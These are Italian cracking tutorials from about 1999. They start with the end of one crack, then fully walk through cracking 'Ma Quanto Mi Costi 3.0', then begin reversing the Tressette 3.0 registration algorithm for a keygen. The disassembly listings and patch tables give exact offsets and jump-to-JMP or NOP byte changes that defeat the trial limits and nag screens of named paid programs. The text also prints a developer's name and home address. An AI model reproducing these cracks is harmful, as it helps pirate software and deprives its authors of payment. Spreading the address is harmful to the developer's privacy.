la mancata esecuzione del salto successivo vi far… uscire dal programma
in ogni caso... quindi
00459E74                 jz      short loc_459E81 ;

diventar… da ora in poi

00459E74                  jmp    short loc_459E81

00459E81 loc_459E81:
00459E81		 push	 ebx
00459E82		 lea	 esi, [esp+90h+var_2C]
00459E86		 lea	 eax, [esp+90h+var_58]

00459E8A loc_459E8A:
00459E8A		 mov	 dl, [eax]
00459E8C		 mov	 bl, [esi]
00459E8E		 mov	 cl, dl
00459E90		 cmp	 dl, bl
Ecco un'altro salto importante...
00459E92		 jnz	 short loc_459EC3

mira dittro al farci fuori dalla funzione.... con risultato negativo
sulla registrazione... quindi diventer…
00459E92                  nop
00459E93                  nop

Abbiamo passato anche questo ostacolo... proseguiamo ;)
00459E94		 test	 cl, cl
00459E96		 jz	 short loc_459EAE
00459E98		 mov	 dl, [eax+1]
00459E9B		 mov	 bl, [esi+1]
00459E9E		 mov	 cl, dl
00459EA0		 cmp	 dl, bl
Ancora cmp.. ma quando la finisce quello!!
00459EA2		 jnz	 short loc_459EC3

Vediamo un p• ... punta alla stessa locazione di prima... ovvero a
farci terminare con errore... e cosa facciamo noi ? Spero che lo avete capito
lo stesso lavoro di prima
00459EA2                 nop
00459EA3                 nop

00459EA4		 add	 eax, 2
00459EA7		 add	 esi, 2
00459EAA		 test	 cl, cl
00459EAC		 jnz	 short loc_459E8A

00459EAE loc_459EAE:
00459EAE		 xor	 eax, eax
00459EB0		 xor	 ecx, ecx
00459EB2		 test	 eax, eax
00459EB4		 setz	 cl
00459EB7		 pop	 ebx
00459EB8		 pop	 edi
00459EB9		 mov	 eax, ecx
00459EBB		 pop	 esi
00459EBC		 add	 esp, 84h
00459EC2		 retn	 

Ok siamo qui.... il programma  gi… registrato (avete premuto G ??)
ora per• dobbiamo apportare le modifiche in modo permanente nel programma...
quindi ecco una tabella riassuntiva dei byte da modificare:

Locazione  BYTE

00459E74   0EBh

00459E92   090h
00459E93   090h

00459EA2   090h
00459EA3   090h

Con soli 5 byte (gli indirizzi si riferiscono usando l'editore HIEW...)
abbiamo registrato un programma che costa 80.000 lire.... quanto mi piace
questo mestiere!!!!

Bene l'articolo  finito.... dovrei passare come al solito ai ringraziamenti!

Chi ringrazio??? Grossa domanda.... l'altra volta qualcuno s'e' lamentato
in quanto ha detto di non nominarlo altrimenti gli rovino la reputazione :(
Ok non lo nomino e non ne nomino moooooolti altri in quanto sinceramente
sono stati confusi come membri di e-ViP e non lo erano ;)

eXceptiON HandlER, Techno Knight, Johnny, LanDLorD, anto1, DeViLNeT, ^WaR^CaT^
.... questi sono i membri di e-ViP.... almeno lo spero.... non so se ne ho
saltato qualcuno... ma sinceramente non si capisce pi— niente...

Felix e Lisa... fratello e sorella... gli opposti... anche se prima si
facevano vivi entrambi ora se c'e' n'e' uno non c'e' l'altro..

dibbe76 che mi rifornisce di tanto in tanto di qualche CD... grazie!
Artiglio.. anche lui....

Quequero... il dirigente dell'UIC a cui sarei iscritto.... ma purtroppo
non posso partecipare in quanto non tengo il tempo e mi rompo a fare tutto
quello che quequero dice... crackare questo... seriale di quello.. articolo
scritto sul form... quindi mi limito solo a fare i compiti x me :)
MI DISPIACE QUEQUERO.... SPERO CHE UN GIORNO POSSA TORNARE A ESSERE UN TUO
ALUNNO

[alt255] ~Ziofill~ e nobody88 per i complimenti sull'articolo publicato in
Newsbies n. 4

Il mio amico Pietro... che di tanto in tanto viene a fare visita a un relitto
della societ…... una delle poche persone che sanno che sono vivo! Molti la
fuori mi pensano morto!! .. o almeno non mi faccio vivo da parecchio tempo!!!

Bene.. ora  giunta proprio la fine dell'articolo... sono quasi le 13.00 ed 
ora che vada a magnare.. altrimenti mia madre attacca a rompere...
... se vi state domandando come mai sono qui a quest'ora... diciamo una cosa
la scuola per me  finitaaaaaaaaaaaaaaaaaaaa!!!!!!!!!!!!!!

Vi lascio il mio indirizzo di e-mail.... semmai vi viene in mente di scrivermi
fate pure... cod@gurlmail.com

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                   *******************************                               
                   *                             *                            
                   *    Ma Quanto Mi Costi 3.0   *                       
                   *                             *                                 
                   *                 by Ritz     *                             
                   *                             *
                   *******************************
        
                   BEST VIEWED WITH M$-d0$ 3D1T0R

******************************************************************************
DESCLAIMER LEGALE:
Ascoltatemi bene prima di leggere questo articolo: esso  stato scritto a PURO
scopo DIDATTICO: io, Ritz, non incoraggio chi volesse servirsene per scopi
illegali; inoltre non mi assumo alcuna responsabilit... se vi autodistruggete
i progammi. CAPITTOOOO?!
******************************************************************************

Ciao a tutti! Io mi chiamo Ritz (ma vaaa??), e in questo tute cercher• di
spiegare la sprotezione di un programma che non offre alcuna possibilit… di
registrazione (o almeno io non l'ho trovata... :-) ). Di conseguenza, l'unica
cosa da fare sar… forzare il codice in alcuni punti. Dopo aver fatto ci•,
sar… inoltre necessario togliere un fastidioso nag-screen iniziale.

Il proggy si trova in varie riviste informatiche o al sito:
www.space.tin.it/internet/apizzegh e funge da contascatti per Internet.

OK... tutti pronti? S? Perfetto... let's go!

Allora, installato il programmillo? Perfetto... avviatelo: cercare ora un
men— tipo About/Register. Azz, non c', provate ora a guardare l'iconetta del
Systray: clic destro, scegliete "Informazioni su MQMC32", vi apparir… un
menu... okkakkio, nemmeno l si pu• mettere il serial... come si fa? Beh,
evidentemente il programma  uno di quelli che dopo 30 gg. si suicidano e
basta. Quindi? Semplice... chiudete l'icona del Systray, portate avanti la
data di 4-5 mesi, riavviate il prog... e, eccovi apparire il messaggio che
vi dice che non lo potete pi— avviare perch il periodo di valutazione 
scaduto. Male, molto male. Bisogna lavorarci un po' su, che ne dite?

Allora, innanzi tutto bisogna far s che il prog. possa essere avviato...
proviamo quindi a intercettare la funzione che manda il nag iniziale...
CTRL+D per poppare nel Sice, quindi bpx messageboxa. Usciamo con CTRD+D,
riavviamo tutto, e... kakkio il debugger non poppa prima della messagebox...
perch mai? Se avete notato, quando il messaggio appare il PC fa un "beep",
vero? Bene, allora proviamo a cambiare il BPX con un messagebeep: togliete
l'iconetta del MQMC dal Tray, entrate nel Sice, scrivete bpx messagebeep,
uscite, avviate il MQMC, e, voil….., il vostro debugger preferito fa la sua
comparsa!! Usciti dalla funzione con F11, dovreste attraccare qui:

:0048A202 PUSH 32

S? Perfetto! Adesso cancellate tutti i bpx del Sice con bc *, aprite il
vostro W32dasm, disassemblate il file mqmc32.exe... bzzzzzzzzz....zzzzzz...
bzzzzzzzz. Finito!! Ora andate nel menu Search/Find text, scrivete :0048A202,
aspettate un po'... e dovreste arrivare a questo punto:

* Possible StringData Ref from Code Obj ->"10474"
|
:0048A1D9 mov edx, 0048A63C
:0048A1DE call 00403F04
:0048A1E3 jne 0048A228 <-- Jump importante... servir….. un po' pi— avanti.
:0048A1E5 mov eax, dword ptr [0049C244]
:0048A1EA cmp dword ptr [eax], 00000000
:0048A1ED je 0048A1FB 
:0048A1EF mov eax, dword ptr [0049C244]
:0048A1F4 mov eax, dword ptr [eax]
:0048A1F6 call 00430A74

* Jump at Address:
|:0048A1ED(C)
|
:0048A1FB push 00000000

* Reference To: user32.MessageBeep, Ord:0000h
|
:0048A1FD Call 00406C9C
:0048A202 push 00000032
:0048A204 mov cx, word ptr [0048A644]
:0048A20B mov dl, 02


* Possible StringData Ref from Code Obj ->"MQMC323.0"
|
:0048A20D mov eax, 0048A650
:0048A212 call 00444C24
:0048A217 mov eax, dword ptr [0049C28C]
:0048A21C mov eax, dword ptr [eax]
:0048A21E call 00432A34
:0048A223 jmp 0048A5A7

* Jump at Address:
|:0048A1E3(C)
|
:0048A228 8D4DB0 lea ecx, dword ptr [ebp-50]


Allora... analizziamo il codice... in 48A1FD c' la call del nag-screen...
osservando ora 48E1ED si vede un JE... Jump if Equal... cambiandolo in JMP
si salterebbe la CALL a 41A8F6... implicata probabilmente nel suicidio del
programma dopo il suo avvio. Dunque, segnatevi l'OFFSET di 48E1ED: dovrebbe
essere 895ED... bene, fatevi una copia di MQMC.exe e lasciatela nella stessa
cartella, aprite Hiew, caricate la copia, premete F4, scegliete Decode, poi
F5, scrivete l'OFFSET, premete INVIO, quindi F3 per cambiare il byte 75 in
EB (jump incondizionale), F9 per aggiornare lo schermo, F10 per uscire. Ora
dalla cartella del MQMC caricate la copia (quella taroccata), e vi apparir…..
ancora il nag (questo era previsto), ma, se cliccate OK, il prog PARTE!! Lo
avete crackaaatooo. Se ci siete riusciti, complimenti, altrimenti rileggetevi
tutto daccapo...

Ora per• c' un piccolo problema teknico: il nag-screen che rompe le palle:
uhm... vediamo che se po' fa'.

Vedete la call a 48A1FD? Quella sar….. la routine da fottere: infatti, 
proprio quella che richiama la Message Box. Fateci doppio clic col topo e in
mezzo alla barra dei pulsanti del Dasm dovrebbe "accendersi" una scritta:
CALL. Cliccateci sopra. (* Cazzo mi si sta inkiodando il Winkaz... 67%
risorse disponibili... pork putt meglio riavviare... schiusatemi un attimo...
torno subito, il mio Celeron overclokkato tra un po' si fonde... OK ho
riavviato... ora mi sento pi— tranquillo... ripartiamo*). Avete cliccato
sulla CALL? Bene, allora ora vi trovate qui:

* Referenced by a CALL at Addresses:
|:00455B69 , :00455E97 , :00458189 , :00461087 , :004612F6 
|:00461326 , :0046A09B , :0046A100 , :0046ABB4 , :0046AC3D 
|:0046ACAF , :0046AD10 , :0046AD71 , :0046ADDE , :0046B8A6 
|:0046B909 , :0047E62A , :00484B80 , :00484F17 , :0048A1FD 
|:0048A3AE , :0048A42F , :0048D945 , :00491AA1 , :004922CD 
|:00492AC6 , :0049328D 
|

* Reference To: user32.MessageBeep, Ord:0000h
|
:00406C9C Jmp dword ptr [0049F66C]
:00406CA2 mov eax, eax

In teoria ora bisognerebbe fare un lavoretto, ovverosia (WOW!) spulciare
OGNUNO degli indirizzi sopra... fate una prova: andate a :00455E97. Due righe
pi— in altro vedrete un jne che, se eseguito, SALTA COMPLETAMENTE VIA la call.
Ecco quindi che bisognerebbe cambiarlo in JMP. Tornate ora a :00406C9C;
capito cosa dovete fare? Andare in OGNUNA dlle CALL sopra, trovare i JUMP che
le saltano e cambiarli in JMP incondizionali... il problema  che non tutte
tali call sono necessarie, anzi, e inoltre alcune, come ad esempio la prima
(:00455B69), non hanno jump che le possano evitare nei dintorni... insomma,
un casino... ecco perch ho deciso di dirvi io direttamente quali sono quelle
su cui agire (vi pensate che lavorazzo ho fatto?!): l'importante  che voi
capiate il concetto per poi poterlo applicare nelle varie occasioni.

Andate in :0048A1FD. Vi troverete nel codice visto all'inizio: ecco a cosa
serve il jne a :0048A1E3!!! E' uno di quelli che fottono la CALL!! Infatti
se eseguito il proggy salta pi— avanti!

Ora posteggiate il kulo in :0048A3AE. Sarete qui:

* Possible StringData Ref from Code Obj ->"0003"
|
:0048A321 mov edx, 0048A728
:0048A326 mov eax, dword ptr [ebx+00000220]
:0048A32C call 0045FA70
:0048A331 lea edx, dword ptr [ebp-50]
:0048A334 lea eax, dword ptr [ebp-40]
:0048A337 call 00404C0C
:0048A33C mov eax, dword ptr [ebp-40]
:0048A33F lea ecx, dword ptr [ebp-3C]
:0048A342 mov edx, 00000004
:0048A347 call 00489D84
:0048A34C mov ecx, dword ptr [ebp-3C]
:0048A34F lea eax, dword ptr [ebp-38]
:0048A352 mov edx, 0048A630
:0048A357 call 00403E40
:0048A35C mov eax, dword ptr [ebp-38]
:0048A35F call 00407F84
:0048A364 mov dword ptr [ebp-54], eax
:0048A367 fild dword ptr [ebp-54]
:0048A36A add esp, FFFFFFF8
:0048A36D fstp qword ptr [esp]
:0048A370 wait
:0048A371 lea eax, dword ptr [ebp-04]
:0048A374 call 00409D38
:0048A379 cmp dword ptr [ebp-04], 00000000
:0048A37D je 0048A3D9
:0048A37F mov eax, dword ptr [ebp-04]
:0048A382 call 0040A4B0
:0048A387 fstp qword ptr [ebp-1C]
:0048A38A wait
:0048A38B fld qword ptr [ebp-0C]
:0048A38E fcomp qword ptr [ebp-1C]
:0048A391 fstsw ax
:0048A393 sahf
:0048A394 jnb 0048A3D9 <-- Jump if not below... interessante non vi sembra?
:0048A396 mov eax, dword ptr [0049C244]   Guardate DOVE salta: DOPO la CALL
:0048A39B cmp dword ptr [eax], 00000000   a :0048A3AE!! Bene bene...
:0048A39E je 0048A3AC
:0048A3A0 mov eax, dword ptr [0049C244]
:0048A3A5 mov eax, dword ptr [eax]
:0048A3A7 call 00430A74

* Jump at Address:
|:0048A39E(C)
|
:0048A3AC push 00000000

* Reference To: user32.MessageBeep, Ord:0000h
|
:0048A3AE Call 00406C9C
:0048A3B3 push 00000032
:0048A3B5 mov cx, word ptr [0048A644]
:0048A3BC mov dl, 02


* Possible StringData Ref from Code Obj ->"MQMC323.0"
|
:0048A3BE mov eax, 0048A650
:0048A3C3 call 00444C24
:0048A3C8 mov eax, dword ptr [0049C28C]
:0048A3CD mov eax, dword ptr [eax]
:0048A3CF call 00432A34
:0048A3D4 jmp 0048A5A7

* Jump at Addresses:
|:0048A37D(C), :0048A394(C)
|
:0048A3D9 mov cx, word ptr [ebp-28]
:0048A3DD mov dx, word ptr [ebp-26]
:0048A3E1 mov ax, word ptr [ebp-24]
:0048A3E5 call 00408F88
:0048A3EA fstp qword ptr [ebp-5C]
:0048A3ED wait
:0048A3EE mov cx, word ptr [ebp-22]
:0048A3F2 mov dx, word ptr [ebp-20]
:0048A3F6 mov ax, word ptr [ebp-1E]
:0048A3FA call 00408F88
:0048A3FF fsubr qword ptr [ebp-5C]
:0048A402 call 00402A98
:0048A407 mov word ptr [0049DC04], ax
:0048A40D cmp word ptr [0049DC04], 001E
:0048A415 jbe 0048A485
:0048A417 mov eax, dword ptr [0049C244]
:0048A41C cmp dword ptr [eax], 00000000
:0048A41F je 0048A42D
:0048A421 mov eax, dword ptr [0049C244]
:0048A426 mov eax, dword ptr [eax]
:0048A428 call 00430A74

Infine in :0048A42F. Attraccherete qui:

* Jump at Addresses:
|:0048A37D(C), :0048A394(C)
|
:0048A3D9 mov cx, word ptr [ebp-28]
:0048A3DD mov dx, word ptr [ebp-26]
:0048A3E1 mov ax, word ptr [ebp-24]
:0048A3E5 call 00408F88
:0048A3EA fstp qword ptr [ebp-5C]
:0048A3ED wait
:0048A3EE mov cx, word ptr [ebp-22]
:0048A3F2 mov dx, word ptr [ebp-20]
:0048A3F6 mov ax, word ptr [ebp-1E]
:0048A3FA call 00408F88
:0048A3FF fsubr qword ptr [ebp-5C]
:0048A402 call 00402A98
:0048A407 mov word ptr [0049DC04], ax
:0048A40D cmp word ptr [0049DC04], 001E
:0048A415 jbe 0048A485 <-- Jump if below or equal... WOW un altro che salta
:0048A417 mov eax, dword ptr [0049C244]                    DOPO la CALL!!
:0048A41C cmp dword ptr [eax], 00000000
:0048A41F je 0048A42D
:0048A421 mov eax, dword ptr [0049C244]
:0048A426 mov eax, dword ptr [eax]
:0048A428 call 00430A74

* Jump at Address:
|:0048A41F(C)
|
:0048A42D 6A00 push 00000000

* Reference To: user32.MessageBeep, Ord:0000h
|
:0048A42F Call 00406C9C
:0048A434 lea ecx, dword ptr [ebp-38]
:0048A437 mov edx, 00000006
:0048A43C mov eax, 000028EA
:0048A441 call 00489F6C
:0048A446 mov edx, dword ptr [ebp-38]
:0048A449 lea eax, dword ptr [ebp-50]
:0048A44C call 00404C60
:0048A451 lea ecx, dword ptr [ebp-50]

* Possible StringData Ref from Code Obj ->"0001"
|
:0048A454 mov edx, 0048A620
:0048A459 mov eax, dword ptr [ebx+00000220]
:0048A45F call 0045F848
:0048A464 push 00000032
:0048A466 mov cx, word ptr [0048A644]
:0048A46D mov dl, 02

* Possible StringData Ref from Code Obj ->"MQMC323.0"
|
:0048A46F mov eax, 0048A650
:0048A474 call 00444C24
:0048A479 mov eax, dword ptr [0049C28C]
:0048A47E mov eax, dword ptr [eax]
:0048A480 call 00432A34

* Jump at Addresses:
|:0048A281(U), :0048A415(C)
|
:0048A485 call 00409148
:0048A48A call 00402A98
:0048A48F lea ecx, dword ptr [ebp-38]
:0048A492 mov edx, 00000004
:0048A497 call 00489F6C
:0048A49C mov edx, dword ptr [ebp-38]
:0048A49F lea eax, dword ptr [ebp-50]
:0048A4A2 call 00404C60
:0048A4A7 lea ecx, dword ptr [ebp-50]

OK perfetto... lavoro praticamente finito... per eliminare il nag basta
cambiare i 3 JUMP indicati sopra in JMP incondizionali. Come fare ve l'ho
gi….. spiegato sopra... e infine rinominare prima il file MQMC.exe come cazzo
volete, poi la sua copia in MQMC32.exe. Tutto chiaro?
Bene: PROGRAMMA CRACKATO.

RIASSUMENDO

INDIRIZZI HA CAMBIARE:

Per il programma: 48A1ED (OFFSET 895ED da je a jmp).

Per il nag-screen: 48A1E3 (OFFSET 895E3 da jne a jmp), 48A394 (OFFSET 89794
da jnb a jmp), 48A415 (OFFSET 89815 da jbe a jmp).

OK ho finito... uff che fatica... non pensavo che scrivere un tute fosse cos
lungo...
Bene, spero che esso vi sia stato utile, io da parte mia ho cercato di
scriverlo nel migliore dei modi, cio semplice e comprensibile a tutti.
Se vi piace, non vi piace, volete insultarmi, chiedermi qualcosa,
ecc.... basta che mandiate un'e-mail all'indirizzo sotto.

Vorrei ora ringraziare po' di persone..... ometto di dilungarmi troppo
sulle rispettive motivazioni, altrimenti questa parte viene pi— lunga
dell'Essay...
Ringrazio e saluto: Quequero innanzi tutto per aver publicato il mio 
tute sull'UIC, per l'impegno che sta dimostrando con l'UIC stessa e 
perch mi risponde a tutte le domande che gli faccio: ciao QUEEEE!!, 
[aLT255], ^courier, mOoNsHaDoW e WhiteFly, sempre molto disponibili 
su IRC, tutti i compagni dell'UIC e spec. BlackDruiD ( quello che 
vedo di pi— e a cui scasso di + le palle ;) ), xOANINO (il mito), 
tutti i Ringzer0 (perch sono GRANDIII), quindi sPEzio, +MaLa,
Furb3t, etc... in generale tutto il chan di #crack-it, tutti gli Attila_Hack
members, in particolare BoBo, e naturalmente NobodY88 e tutto il Newbies
staff: grazie per la presente pubblicazione ;) e per le chiacchierate su
IRC: ciao nobooooooo!!!!

Saluto anche DFX, great friend nonch compagno di scuola, il Morando (altro
amico) e coloro che sono arrivari a leggere fino in fonto questo tute...
GRAZIEEEEE!!!! E mi raccomando: citando una frase di...azz chi era... boh...
non so, spero che costui mi perdoner… per il copyright violato... ricordate:
"A day without learning is a lost day..." Impariamo, gente, impariamo. E mi
raccomando: in bocca all'ASM!!

SeE YoU sOoN,

              ****************************************************
              *                                                  *
              *                       Ritz                       *
              *                Eclyps3@excite.com                *
              * - The way is made clear when viewed from above - *
              *                On ICQ: 41793377                  *                       
              *                  On IRC: Ritz                    *
              *                                                  *
              ****************************************************

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                    ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                    ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                    ÷³     TRESSETTE 3.0 CRACKING     ³÷
                    ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                    ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

 Autore: cod/e-ViP
Oggetto: Tressette 3.0
   Data: 12 Ottobre 1999

    Eccomi qui di nuovo a crackare qualche cosa... stavolta scegliamo un
prodotto di casa nostra... che tuttavia non costa chiss… quali cifre...
 19.900 lire ci vengono richieste infatti per la registrazione.

     Il software  scaricabile dal seguente indirizzo internet:
http://www.geocities.com/Colosseum/Dome/4981

     Questo  il sito dell'autore, un certo:

Baldi Maurizio
via Berlino, n. 2
58022 Follonica (GR)

Scaricata questa piccolo programmino (circa 943.000 byte) ne effettuiamo
l'installazione. Non credo che vada ad occupare pi— di 3mb sul nostro disco.

A cosa serve questo software ? Praticamente a nulla!!! Ma se vi piace il
gioco delle carte e sapete giocare al TRESSETTE credo che questo sia uno
dei tanti giochini disponibili sulla rete. Bene, installato il programma
lo eseguiamo, e subito l'occhio va su quella maledetta frase presente sul
titolo della finestra... Potrete ancora giocare 30 partite! Come ancora ?
Ma se non ne ho finita manco una!!! Sinceramente giocare a carte non 
la mia passione (per• il discorso cambia durante le feste natalizie quando
si incomincia a sentire l'odore dei soldi ;) ). Cosa fare ?
Bene andiamo sull'ultima finestra del menu e clickiamo. Notiamo che tra
le voci presenti ce ne sta una che dice 'Registrazione' ... interessante.
Clicko e compare una finestra.. Nome e codice.. tipico di tutti questi
programmi... ok ci metto il mio nome "cod" e il numero di registrazione
preferito... in questo momento non me ne vengono in mente di speciale e
quindi ci metto un numero a caso "666" e clicko su ok !!
Che mi compare ? Spiacente, il codice non  esatto... minchia non avevo
visto programmatori cos gentili, che ti indicano che hai sbagliato
combinazione nome/seriale. Cosa fare ? Bel dubbio...
1. Crackarlo
2. Prenderci il seriale
3. Fare un keymaker

Ok, allora scartiamo la prima ipotesi perch altrimenti dovremmo eseguire
passo passo il programma alla ricerca delle zone in cui verifica durante
il caricamento se siamo utenti registrati... prenderci il seriale, si
ottima idea, ma chi non ha dimestichezza col SoftICE e soprattutto con
l'assembly ? Quindi cosa ci resta ? La 3. ipotesi!

Strumenti utilizzati:
SoftICE 4.0 - Io uso questo! Voi prendete quello che vi pare... fatti vostri
IDA 3.8xx   - Non ricordo quale versione sto utilizzando, se la 3.8A o se una
              superiore alla 3.8A, bah non importa cos tanto!

Uno schieramento di strumenti abbastanza robusti... chiss… cosa ci aspetta!
E soprattutto... in cosa  scritto il programma ? Fosse VB.. mi sparo!!
Per nostra fortuna  stato scritto nel migliore dei linguaggi di
programmazione e usando il compilatore pi— gettonato! Il Visual C++, per•
l'autore a quanto pare,  un fanatico di Microsoft,  addirittura ricorso
all'uso delle Microsoft Foundation Class... quindi qualcosa lo differisce
da me... infatti io la prima cosa quando installo MSVC++ le MFC le rimuovo
per prime! Tanto non le user• mai!!! Ora pensiamo a quanto segue.. le MFC
sono generiche... ovvero Microsoft ogni volta che crea una nuova versione
al limite si ammazza di lavoro ad aggiornarle, a correggere qualche piccolo
bug, ma le funzioni usate saranno quelle generiche!!!

Con SoftICE caricato lanciamo il programmino e andiamo su Registrazione...
nome quellochevipare numero metteteci_pure_quello_della_vostra_scuola
Ora CTRL+D, settiamo un bel breakpoint sulle seguenti funzioni:
GetWindowTextA
GetDlgItemTextA
GetDlgItem

CTRL+D e ritorniamo a windows, premiamo il fatidico OK e il gioco sta
per incominciare!!! SoftICE ci avverte che  in esecuzione la funzione
GetWindowTextA... siamo all'interno del codice delle MFC, quindi premiamo
F12, usciamo da GetWindowTextA, rimuoviamo tutti i breakpoint e premiamo
F10 finch non entriamo nel codice del Tressette... qui si lavora!!!!

Allora ecco dove vi troverete esattamente!!!

00404067 call    j_?GetWindowTextA@CWnd@@QBEHPADH@Z

Ecco qui... siamo appena usciti dalla CALL delle MFC GetWindowTextA...
Vediamo un p•, nel programma abbiamo inserito due numeri, quindi presumo
che un'altra CALL a GetWindowTextA si trover… nelle vicinanze!

0040406C push    100h
00404071 lea     eax, [ebp+var_310]
00404077 push    eax
00404078 mov     ecx, [esi+64h]
0040407B call    j_?GetWindowTextA@CWnd@@QBEHPADH@Z

Ecco manco il tempo di respirare che il programma legge la nostra bella
password! Allora la elaborer… pi— avanti.... quindi attenti a cosa facciamo!

00404080 mov     ecx, 0FFFFFFFFh
00404085 sub     eax, eax
00404087 repne scasb
00404089 not     ecx
0040408B dec     ecx
0040408C cmp     ecx, 6
0040408F jb      loc_4041E7

Allora vediamo un p• di capire questo codice riportato in alto... qualcuno
di voi se ha un p• di esperienza con l'assembler o con un debugger avr…
visto questo frammento, ma cosa fa ? E' una forma assai strana per un
compilatore, ma forse si tratta di una ottimizzazione del codice in velocit….
Il fatto sta che questo frammento di codice si trova ovunque nei programmi
ad alto livello quando si tratta di trovare un carattere o la fine di una
stringa! Infatti i registri DS:ESI puntano ad una stringa, ECX conterr…
il valore -1, e repne scasb per chi avesse la fortuna di avere un manuale
sulle istruzioni del processore prodotto da INTEL trover… che questa forma
stupida di istruzione esegue la scansione per n volte quanto  specificato
in ECX (-1 o anche 2^32-1, ovvero circa 4*1024*1024*1024 di volte) finch
non viene trovato il valore contenuto nel registro EAX, AX, o AL a seconda
se si tratta di scasd, scasw o scasb. Successivamente viene invertito il
valore di ECX, e decrementato di 1 ed avremmo la lunghezza della stringa
escluso lo 0 che costituisce la fine della stringa! Subito dopo incontriamo
un cmp ecx, 6 e un jump if below... ovvero se inseriamo una stringa con
meno di 6 caratteri il programma salta! Se facciamo caso all'help on line
l'autore ci speficica che vuole nome e cognome di chi si vuole registrare
ed un Username ed in mancanza di tale assumer… come Username la combinazione
cognome/nome o nome/cognome!  Ora io mi chiamo cod, ma porca eva! KAZZO
un'altro programma in cui non mi posso registrare col mio nome!!! Ok, allora
sono costretto ad usare il mio vero nome, Antonio e quindi risetto i break
point, e continuo, metto Antonio e mi riporto all'istruzione cmp ecx, 6
Questa volta nessun problema e ci ritroviamo nelle istruzioni sotto!

00404095 lea     eax, [ebp+var_110]
0040409B mov     ecx, dword_4147C8
004040A1 push    eax
004040A2 add     ecx, 0FCh
004040A8 call    sub_401020

La prima CALL importante, non riporto il codice disassemblato di questa
call altrimenti non mi sbrigo mai a finire tale articolo, a spiegarvi come
ragiona il programma e soprattutto a consegnarlo a N0BODY88! L'ho promesso
ieri sera e cerco in parte di mantenere le promesse! Brevemente vi spiego
cosa fa tale CALL... allora apparte tutte quelle superflue istruzioni che
esegue sostanzialmente la CALL si riduce al seguente check!
Controlla tutti i caratteri inseriti nell'Username, controlla che siano
compresi tra 'A' e 'Z' o 'a' e 'z', in caso vi siano altri caratteri
verifica che si tratti di uno spazio altrimenti ci piazza il ben servito!
Non provate a registrare il programma con Username 666666 altrimenti nisba!
Gli unici caratteri tollerati dal programmatore al di fuori delle lettere
dell'alfabeto sono gli spazi.
Successivo controllo:
Legge ogni carattere della Username e lo converte nel corrispondente
carattere maiuscolo, sostituendo gli spazi con delle 'X', inteligente
questo programmatore, assai inteligente, non me lo sarei aspettato!
Alla fine praticamente il mio nome Antonio sar… converito nel seguente
modo:
ANTONIOX
Ora perch quella X finale ? Avr• messo qualche X finale ? No, me ne
sono accorto in un secondo momento quando ho usato il nome che }^CoBrA^{
mi ha fornito, il nome da lui datomi era composto da un numero pari di
caratteri, quindi ho ricontrollato ed era tutto come mi aspettavo!
Con codice assurdo, shift per eseguire delle moltiplicazioni, il programmatore
si era ridotto a codificare in modo assurdo una cosetta del genere:
for (i=0; username[i]!= 0x00; i++)

Ovvero controllare la lunghezza della Username e nel caso questa fosse
dispari piazzarci una bella X finale per poter avere una stringa pari!

Successivamente eseguito questo compito assai inteligente (non dimentichiamo
che codesto programmatore  un tipo inteligente) la Username viene elaborata
con la seguente e complessa formula matematica!!!

Prendiamo il byte x della stringa dove x va da 0 a fine stringa.
Sottriamo il valore 64 ('@') e la differenza la memorizziamo in un array
di long o int32 (ovvero in un array di 4 byte x numero.. che spreco!)

Ora perch questo 64 ? Semplice, perch il 65  la 'A' ... basta fare
ALT+65 e ALT+64!!! Ulteriore controllo, l'array di valori ottenuto viene
scopiazzato in un'altro array ma non all'inizio ma bens pi— avanti....
chiss… perch ? Forse aveva in mente qualcosa di speciale! boooo io mi
limito a commentare... sar…!

004040AD mov     ecx, dword_4147C8
004040B3 add     ecx, 0FCh
004040B9 call    sub_401190

Ecco qui!!!! In questa call viene generata la password partendo dal
nostro Username... non proprio ma dall'array di long o int32 che viene
preparato nella call precedente! L'algoritmo che viene usato  il
seguente:

Array' contiene i long della nostra username!
Array'' contiene all'inizio i seguenti valori:

00000008 ; Array''+0
0000000D ; Array''+1
FFFFFFFB ; Array''+2
FFFFFFF8 ; Array''+3
00000010 ; Array''+4
00000017 ; Array''+5

Codeste bestie di numeri sono espressi sottoforma di valore esadecimale
e la 3 e 4 bestia non  altro che un numero negativo! Ricordatevi quanto
segue: i numeri negativi vengono contrassegnati dai compilatori e dalla
CPU con il bit pi— alto (in tal caso il 31ר bit) settato, e i restanti
bit esprimono il valore negativo! Ora non so perch tutta questa serie
di numeri.. infatti ne usa ben pochi!

Ora come viene elaborata la password ?
Viene prelevato da Array' due numeri alla volta, e il tutto viene
fatto in questo modo:

Val1 = [Array''+1]*[Array'+1]
Ovvero il secondo valore di Array'' viene moltiplicato per il secondo
valore importato da Array'

Val2 = [Array'']*[Array']
Primo valore di Array'' viene moltiplicato per il primo di Array'

Val3 = Val1+Val2

Ora Val3 contiene la somma di queste due moltiplicazione e viene passato
Val3 come parametro alla funzione di controllo, che naturalmente spiego
pi— avanti... comunque sappiate che codesta funzione di controllo
restituisce un numero, che chiamer• Div' per Val3 e Div'' per Val6.

Val4 = [Array''+2]*[Array']
Val5 = [Array''+3]*[Array'+1]
Val6 = Val5+Val4

Come vi ho spiegato su anche Val6 viene passato alla funzione di controllo
che ci dar… in ritorno un Valore che chiameremo Val6! Sar…!!!

La funzione di controllo:

Questa funzione di controllo utilizza il valore passato e lo memorizza
in una variabile interna che per comodit… chiamer• Var1.
All'interno di tale funzione incontreremo un numero fisso, che non cambia
mai, 1Ahex o anche 26dec (non 26 dicembre, 26decimale!)

